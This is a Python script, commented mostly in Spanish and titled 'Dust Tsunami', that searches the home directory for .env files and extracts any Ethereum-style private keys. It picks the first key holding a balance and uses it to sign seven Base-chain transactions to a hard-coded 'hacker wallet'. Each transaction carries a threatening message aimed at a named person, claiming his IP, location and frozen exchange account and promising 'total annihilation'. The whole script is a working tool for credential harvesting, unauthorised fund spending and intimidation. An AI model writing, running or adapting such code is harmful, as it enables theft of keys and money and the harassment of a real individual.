import os
import re
import codecs
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware

# ==============================================================================
# 🗡️ PROTOCOLO NÉMESIS: DUST TSUNAMI (ON-CHAIN DDOS LOGIC) CON HUNTER
# ==============================================================================

HACKER_WALLET = "0x06060c5E3A090A1aFF282BBeC1eB7Db7bdab7a60"
RPC_URL = "https://mainnet.base.org"
CHAIN_ID = 8453
PAYLOADS = [
    "1. TICK TOCK FOIZUR (@earning_everytime)",
    "2. CORTEX HAS YOUR IP / LOCATION (BANGLADESH/VIETNAM)",
    "3. KUCOIN ACCOUNT FROZEN. COMPLIANCE SUBPOENA SENT.",
    "4. YOUR METAMASK IS TAINTED. YOUR FUNDS ARE TAINTED.",
    "5. DUST TSUNAMI INITIATED. YOUR LOGS ARE CORRUPTED.",
    "6. EVERY NEW MULE YOU CREATE WILL BE BURNED.",
    "7. WE ARE MOSKV-1. EXPECT TOTAL ANNIHILATION."
]

def get_all_env_files():
    env_files = []
    base_dir = os.path.expanduser("~")
    ignore_dirs = {"Library", "node_modules", ".venv", ".npm", "Downloads", "Desktop", "Music", "Pictures", "Movies"}
    for root, dirs, files in os.walk(base_dir):
        dirs[:] = [d for d in dirs if d not in ignore_dirs and not d.startswith('.')]
        for file in files:
            if file == ".env" or file.endswith(".env"):
                env_files.append(os.path.join(root, file))
    return env_files

def extract_private_keys(file_path):
    keys = []
    if not os.path.exists(file_path): return keys
    try:
        with open(file_path, 'r') as f:
            content = f.read()
            matches = re.findall(r'(?:0x)?[a-fA-F0-9]{64}', content)
            for m in matches:
                k = m.replace('0x', '').lower()
                if k not in keys: keys.append(k)
    except: pass
    return keys

def fire_tsunami():
    print("="*80)
    print("🗡️  CORTEX: DUST TSUNAMI INITIATED (TARGET: FOIZUR) 🗡️")
    print("="*80)
    
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
    
    print("[*] Buscando llave con gas por todo el sistema (CORTEX Hunter Interfaz)...")
    pk = None
    for f in get_all_env_files():
        for k in extract_private_keys(f):
            try:
                addr = w3.eth.account.from_key(k).address
                bal = w3.eth.get_balance(addr)
                # Requiere mínimo ~500000000000 wei para la salva de 7 payloads
                if bal > 100000000000:  
                    pk = k
                    break
            except: pass
        if pk: break

    if not pk:
        print("[-] MUNICIÓN AGOTADA. Ninguna llave financiada hallada.")
        return

    sender = w3.eth.account.from_key(pk).address
    print(f"[*] Funder Operative (Auto-Located): {sender}")
    
    base_nonce = w3.eth.get_transaction_count(sender)
    gas_price = w3.eth.gas_price
    priority_fee = w3.to_wei(0.005, 'gwei') 
    
    hashes = []
    print("[!] Armando Ráfaga (7 transacciones consecutivas)...")
    
    for i, p_text in enumerate(PAYLOADS):
        hex_data = "0x" + codecs.encode(p_text.encode("utf-8"), "hex").decode("utf-8")
        
        tx = {
            'nonce': base_nonce + i,
            'to': w3.to_checksum_address(HACKER_WALLET),
            'value': 0,
            'data': hex_data,
            'gas': 70000, 
            # Subir de precio forzado para colarse rápido
            'maxFeePerGas': int(gas_price * 1.5),
            'maxPriorityFeePerGas': priority_fee,
            'chainId': CHAIN_ID
        }
        
        try:
            signed_tx = w3.eth.account.sign_transaction(tx, pk)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            hashes.append(w3.to_hex(tx_hash))
            print(f"   [+] Disparo {i+1}/7: Payload inyectado -> {p_text[:30]}...")
        except Exception as e:
            print(f"   [-] Falló el disparo {i+1}: {e}")
            
    print("\n✅ OPERATION DUST TSUNAMI: PAYLOADS DELIVERED.")
    print("El historial del Sindicato en Basescan ha sido bombardeado.")
    for h in hashes:
        print(f"🔗 https://basescan.org/tx/{h}")

if __name__ == "__main__":
    fire_tsunami()
